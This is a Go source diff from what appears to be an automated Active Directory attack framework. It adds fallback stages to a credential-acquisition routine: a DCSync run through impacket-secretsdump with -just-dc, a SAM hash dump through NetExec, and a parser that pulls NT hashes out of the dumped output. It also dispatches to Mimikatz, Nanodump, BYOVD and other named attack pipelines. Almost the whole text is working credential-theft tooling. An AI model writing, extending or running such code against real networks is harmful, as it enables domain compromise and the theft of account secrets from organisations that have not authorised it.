@@ -152,30 +152,51 @@ func RunCredentialAcq(state *core.ADState, profileName string, targetHost string
 
 	fmt.Printf("[*] Target: %s (%s)\n", host.IP, host.Hostname)
 
+	var result *core.ToolResult
 	switch profileName {
 	case "minimal":
-		return executeMimikatzPipeline(state, host, pipeline)
+		result = executeMimikatzPipeline(state, host, pipeline)
 	case "standard":
-		return executeMimikatzPipeline(state, host, pipeline)
+		result = executeMimikatzPipeline(state, host, pipeline)
 	case "aggressive", "bof", "fork":
-		return executeNanodumpPipeline(state, host, pipeline)
+		result = executeNanodumpPipeline(state, host, pipeline)
 	case "byovd":
-		return executeBYOVDPipeline(state, host, pipeline)
+		result = executeBYOVDPipeline(state, host, pipeline)
 	case "coldwer":
-		return executeColdWerPipeline(state, host, pipeline)
+		result = executeColdWerPipeline(state, host, pipeline)
 	case "undefend":
-		return executeUnDefendPipeline(state, host, pipeline)
+		result = executeUnDefendPipeline(state, host, pipeline)
 	case "bluehammer":
-		return executeBlueHammerPipeline(state, host, pipeline)
+		result = executeBlueHammerPipeline(state, host, pipeline)
 	case "phantomkiller":
-		return executePhantomKillerPipeline(state, host, pipeline)
+		result = executePhantomKillerPipeline(state, host, pipeline)
 	case "miniplasma":
-		return executeMiniPlasmaPipeline(state, host, pipeline)
+		result = executeMiniPlasmaPipeline(state, host, pipeline)
 	case "dcsync":
-		return executeDCSyncPipeline(state, host, pipeline)
+		result = executeDCSyncPipeline(state, host, pipeline)
 	default:
-		return executeMimikatzPipeline(state, host, pipeline)
+		result = executeMimikatzPipeline(state, host, pipeline)
 	}
+
+	// Fallback: primary pipeline failed; try impacket-secretsdump DCSync
+	if !result.Success && len(result.Evidence) > 0 && !strings.Contains(result.Evidence[0].Value, "secretsdump") {
+		fmt.Println("[*] Primary pipeline failed, trying DCSync via impacket-secretsdump...")
+		fallback := executeSecretsdumpPipeline(state, host)
+		if fallback.Success {
+			return fallback
+		}
+	}
+
+	// Fallback: try SAM dump via nxc
+	if !result.Success {
+		fmt.Println("[*] Trying SAM dump via nxc...")
+		samResult := executeSAMDump(state, host)
+		if samResult.Success {
+			return samResult
+		}
+	}
+
+	return result
 }
 
 func selectTarget(state *core.ADState, preferred string) (core.Host, bool) {
@@ -791,6 +812,92 @@ func dedupCreds(creds []core.Credential) []core.Credential {
 		}
 	}
 	return unique
+}
+
+func executeSAMDump(state *core.ADState, host core.Host) *core.ToolResult {
+	result := &core.ToolResult{Success: true}
+	domain, user, pass, hash := getCredential(state)
+	if domain == "" || user == "" {
+		result.Success = false
+		return result
+	}
+	target := tools.NetExecTarget{
+		Protocol: "smb", Host: host.IP,
+		Domain: domain, Username: user, Password: pass, Hash: hash,
+	}
+	ctx := context.Background()
+	r, err := tools.NetExec.Run(ctx, target, "--sam", nil)
+	if err == nil && r.Success {
+		result.RawOutput = r.Stdout
+		result.Evidence = append(result.Evidence, core.EvidenceEntry{
+			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
+			Source: "nxc_sam", Key: host.IP, Value: "SAM dump completed",
+			Timestamp: time.Now(),
+		})
+		fmt.Println("[+] SAM dump successful")
+	} else {
+		result.Success = false
+	}
+	return result
+}
+
+func executeSecretsdumpPipeline(state *core.ADState, host core.Host) *core.ToolResult {
+	result := &core.ToolResult{Success: true}
+	domain, user, pass, _ := getCredential(state)
+	if domain == "" || user == "" {
+		result.Success = false
+		return result
+	}
+
+	fmt.Printf("[*] DCSync via impacket-secretsdump against %s...\n", host.IP)
+	target := fmt.Sprintf("%s/%s:%s@%s", domain, user, pass, host.IP)
+	args := []string{target, "-just-dc"}
+	r := utils.RunCommand("impacket-secretsdump", args...)
+	if r.Success {
+		result.RawOutput = r.Stdout
+		creds := parseSecretsdumpOutput(r.Stdout, domain)
+		result.Creds = append(result.Creds, creds...)
+		for _, c := range creds {
+			result.Evidence = append(result.Evidence, core.EvidenceEntry{
+				Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
+				Source: "secretsdump", Key: c.Username + "@" + c.Domain,
+				Value: c.Secret, Confidence: 0.9,
+				RawOutput: r.Stdout, Timestamp: time.Now(),
+			})
+		}
+		fmt.Printf("[+] Secretsdump: %d credentials found\n", len(creds))
+	} else {
+		result.Success = false
+		fmt.Printf("[!] Secretsdump failed: %s\n", r.Stderr)
+	}
+	return result
+}
+
+func parseSecretsdumpOutput(output, domain string) []core.Credential {
+	var creds []core.Credential
+	lines := strings.Split(output, "\n")
+	for _, line := range lines {
+		trimmed := strings.TrimSpace(line)
+		if strings.Contains(trimmed, ":::") && !strings.HasPrefix(trimmed, "[") {
+			parts := strings.SplitN(trimmed, ":", 4)
+			if len(parts) >= 4 {
+				username := parts[0]
+				if strings.Contains(username, "\\") {
+					parts2 := strings.SplitN(username, "\\", 2)
+					username = parts2[1]
+				}
+				nthash := strings.TrimSpace(strings.SplitN(parts[3], ":::", 2)[0])
+				if nthash != "" && !strings.Contains(nthash, " ") && len(nthash) == 32 {
+					creds = append(creds, core.Credential{
+						Type: core.CredHash, Username: username,
+						Domain: domain, Hash: nthash, Secret: nthash,
+						Source: "secretsdump",
+					})
+				}
+			}
+		}
+	}
+	return creds
 }
 
 func sanitizeMimikatzCommand(cmd string) string {
